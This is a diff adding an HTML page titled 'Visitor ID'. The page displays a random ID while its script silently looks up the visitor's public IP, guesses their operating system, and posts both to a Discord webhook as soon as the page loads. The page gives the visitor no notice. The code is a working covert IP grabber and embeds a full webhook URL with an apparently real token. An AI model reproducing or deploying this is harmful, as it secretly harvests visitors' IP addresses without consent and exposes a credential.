@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Visitor ID</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .box { background: #f0f0f0; padding: 15px; border-radius: 8px; text-align: center; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Visitor ID</h2>
+    <p id="visitor"></p>
+  </div>
+
+  <script>
+    // Generate unique visitor ID
+    const visitorID = crypto.randomUUID();
+    document.getElementById("visitor").textContent = visitorID;
+
+    // Detect OS
+    const ua = navigator.userAgent;
+    let osName = "Unknown";
+    if (ua.includes("Windows")) osName = "Windows";
+    else if (ua.includes("Mac")) osName = "macOS";
+    else if (ua.includes("Linux")) osName = "Linux";
+    else if (ua.includes("Android")) osName = "Android";
+    else if (ua.includes("iPhone") || ua.includes("iPad")) osName = "iOS";
+
+    // Fetch public IP and send all info to Discord webhook
+    fetch("https://api.ipify.org?format=json")
+      .then(r => r.json())
+      .then(data => {
+        const ipAddress = data.ip;
+
+        const webhookURL = "https://discord.com/api/webhooks/1323254457818943571/wa-Xj7g8jjFmyKeLZ86a55UXUfhUA2MgC93xJMMBX2k10m86jU51RGXwvSGfi70s4iLg"; // replace with your webhook
+        const payload = {
+          content: `Visitor ID: ${visitorID}\nOS: ${osName}\nIP: ${ipAddress}`
+        };
+
+        fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        })
+        .then(() => console.log("Visitor info sent to Discord!"))
+        .catch(err => console.error("Failed to send webhook:", err));
+      })
+      .catch(() => console.error("Failed to fetch IP"));
+  </script>
+</body>
+</html>
